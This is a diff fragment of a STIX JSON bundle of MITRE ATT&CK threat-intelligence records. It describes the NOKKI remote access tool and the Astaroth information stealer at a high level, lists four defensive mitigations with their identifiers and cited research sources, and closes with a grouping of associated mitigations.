+      "description": "[NOKKI](https://attack.mitre.org/software/S0353) is a modular remote access tool. The earliest observed attack using [NOKKI](https://attack.mitre.org/software/S0353) was in January 2018. [NOKKI](https://attack.mitre.org/software/S0353) has significant code overlap with the [KONNI](https://attack.mitre.org/software/S0356) malware family. There is some evidence potentially linking [NOKKI](https://attack.mitre.org/software/S0353) to [APT37](https://attack.mitre.org/groups/G0067).(Citation: Unit 42 NOKKI Sept 2018)(Citation: Unit 42 Nokki Oct 2018)",
+      "labels": [
+        "malware"
+      ],
+      "x_mitre_platforms": [
+        "Windows"
+      ],
+      "x_mitre_domains": [
+        "enterprise-attack"
+      ],
+      "x_mitre_aliases": [
+        "NOKKI"
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "id": "malware--071d5d65-83ec-4a55-acfa-be7d5f28ba9a",
+      "type": "malware",
+      "created": "2019-01-30T19:50:45.307Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "external_references": [
+        {
+          "external_id": "S0353",
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/software/S0353"
+        },
+        {
+          "source_name": "NOKKI",
+          "description": "(Citation: Unit 42 NOKKI Sept 2018)"
+        },
+        {
+          "source_name": "Unit 42 NOKKI Sept 2018",
+          "url": "https://researchcenter.paloaltonetworks.com/2018/09/unit42-new-konni-malware-attacking-eurasia-southeast-asia/",
+          "description": "Grunzweig, J., Lee, B. (2018, September 27). New KONNI Malware attacking Eurasia and Southeast Asia. Retrieved November 5, 2018."
+        },
+        {
+          "source_name": "Unit 42 Nokki Oct 2018",
+          "url": "https://researchcenter.paloaltonetworks.com/2018/10/unit42-nokki-almost-ties-the-knot-with-dogcall-reaper-group-uses-new-malware-to-deploy-rat/",
+          "description": "Grunzweig, J. (2018, October 01). NOKKI Almost Ties the Knot with DOGCALL: Reaper Group Uses New Malware to Deploy RAT. Retrieved November 5, 2018."
+        }
+      ],
+      "x_mitre_version": "1.1",
+      "x_mitre_attack_spec_version": "2.1.0",
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+    },
+    {
+      "modified": "2023-03-21T21:20:23.717Z",
+      "name": "Astaroth",
+      "description": "[Astaroth](https://attack.mitre.org/software/S0373) is a Trojan and information stealer known to affect companies in Europe, Brazil, and throughout Latin America. It has been known publicly since at least late 2017. (Citation: Cybereason Astaroth Feb 2019)(Citation: Cofense Astaroth Sept 2018)(Citation: Securelist Brazilian Banking Malware July 2020)",
+      "x_mitre_platforms": [
+        "Windows"
+      ],
+      "x_mitre_deprecated": false,
+      "x_mitre_domains": [
+        "enterprise-attack"
+      ],
+      "x_mitre_version": "2.1",
+      "x_mitre_contributors": [
+        "Carlos Borges, @huntingneo, CIP"
+      ],
+      "x_mitre_aliases": [
+        "Astaroth",
+        "Guildma"
+      ],
+      "type": "malware",
+      "id": "malware--edb24a93-1f7a-4bbf-a738-1397a14662c6",
+      "created": "2019-04-17T13:46:38.565Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "revoked": false,
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/software/S0373",
+          "external_id": "S0373"
+        },
+        {
+          "source_name": "Guildma",
+          "description": "(Citation: Securelist Brazilian Banking Malware July 2020)"
+        },
+        {
+          "source_name": "Cofense Astaroth Sept 2018",
+          "description": "Doaty, J., Garrett, P.. (2018, September 10). We’re Seeing a Resurgence of the Demonic Astaroth WMIC Trojan. Retrieved April 17, 2019.",
+          "url": "https://cofense.com/seeing-resurgence-demonic-astaroth-wmic-trojan/"
+        },
+        {
+          "source_name": "Securelist Brazilian Banking Malware July 2020",
+          "description": "GReAT. (2020, July 14). The Tetrade: Brazilian banking malware goes global. Retrieved November 9, 2020.",
+          "url": "https://securelist.com/the-tetrade-brazilian-banking-malware/97779/"
+        },
+        {
+          "source_name": "Cybereason Astaroth Feb 2019",
+          "description": "Salem, E. (2019, February 13). ASTAROTH MALWARE USES LEGITIMATE OS AND ANTIVIRUS PROCESSES TO STEAL PASSWORDS AND PERSONAL DATA. Retrieved April 17, 2019.",
+          "url": "https://www.cybereason.com/blog/information-stealing-malware-targeting-brazil-full-research"
+        }
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "labels": [
+        "malware"
+      ],
+      "x_mitre_attack_spec_version": "3.1.0",
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+    },
+    {
+      "modified": "2023-03-31T17:27:28.395Z",
+      "name": "Operating System Configuration",
+      "description": "Make configuration changes related to the operating system or a common feature of the operating system that result in system hardening against techniques.",
+      "x_mitre_deprecated": false,
+      "x_mitre_domains": [
+        "enterprise-attack"
+      ],
+      "x_mitre_version": "1.2",
+      "type": "course-of-action",
+      "id": "course-of-action--2f316f6c-ae42-44fe-adf8-150989e0f6d3",
+      "created": "2019-06-06T21:16:18.709Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "revoked": false,
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/mitigations/M1028",
+          "external_id": "M1028"
+        }
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "x_mitre_attack_spec_version": "3.1.0",
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+    },
+    {
+      "name": "Software Configuration",
+      "description": "Implement configuration changes to software (other than the operating system) to mitigate security risks associated to how the software operates.",
+      "x_mitre_domains": [
+        "enterprise-attack"
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "id": "course-of-action--b5dbb4c5-b0b1-40b1-80b6-e9e84ab90067",
+      "type": "course-of-action",
+      "created": "2019-07-19T14:40:23.529Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "external_id": "M1054",
+          "url": "https://attack.mitre.org/mitigations/M1054"
+        }
+      ],
+      "modified": "2020-03-31T13:11:09.471Z",
+      "x_mitre_version": "1.1",
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+    },
+    {
+      "name": "Network Intrusion Prevention",
+      "description": "Use intrusion detection signatures to block traffic at network boundaries.",
+      "x_mitre_domains": [
+        "enterprise-attack"
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "id": "course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c",
+      "type": "course-of-action",
+      "created": "2019-06-10T20:46:02.263Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "external_id": "M1031",
+          "url": "https://attack.mitre.org/mitigations/M1031"
+        }
+      ],
+      "modified": "2019-06-10T20:46:02.263Z",
+      "x_mitre_version": "1.0",
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+    },
+    {
+      "modified": "2023-03-31T14:50:47.704Z",
+      "name": "Audit",
+      "description": "Perform audits or scans of systems, permissions, insecure software, insecure configurations, etc. to identify potential weaknesses.",
+      "x_mitre_deprecated": false,
+      "x_mitre_domains": [
+        "enterprise-attack"
+      ],
+      "x_mitre_version": "1.2",
+      "type": "course-of-action",
+      "id": "course-of-action--cc2399fd-3cd3-4319-8d0a-fbd6420cdaf8",
+      "created": "2019-06-11T17:06:14.029Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "revoked": false,
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/mitigations/M1047",
+          "external_id": "M1047"
+        }
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "x_mitre_attack_spec_version": "3.1.0",
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+    },
+    {
+      "id": "grouping--1dfc6c77-06a5-4594-8702-31d35e1148cc",
+      "type": "grouping",
+      "spec_version": 2.1,
+      "created": "2023-09-05T23:23:32+01:00",
+      "modified": "2023-09-05T23:23:32+01:00",
+      "name": "Associated Mitigations",
+      "description": "Associated Mitigations",
+      "context": "unspecified",
+      "object_refs": [
+        "tool--0a68f1f1-da74-4d28-8d9a-696c082706cc",
+        "course-of-action--cc2399fd-3cd3-4319-8d0a-fbd6420cdaf8",
+        "course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c",
+        "course-of-action--b5dbb4c5-b0b1-40b1-80b6-e9e84ab90067",
+        "course-of-action--2f316f6c-ae42-44fe-adf8-150989e0f6d3",
+        "course-of-action--39ac0090-f642-4cf4-8862-5ac0ba525f60",
+        "course-of-action--9ce01a7f-10b4-4d82-a636-4201d020bba7"
+      ]
+    }
+  ]
+}
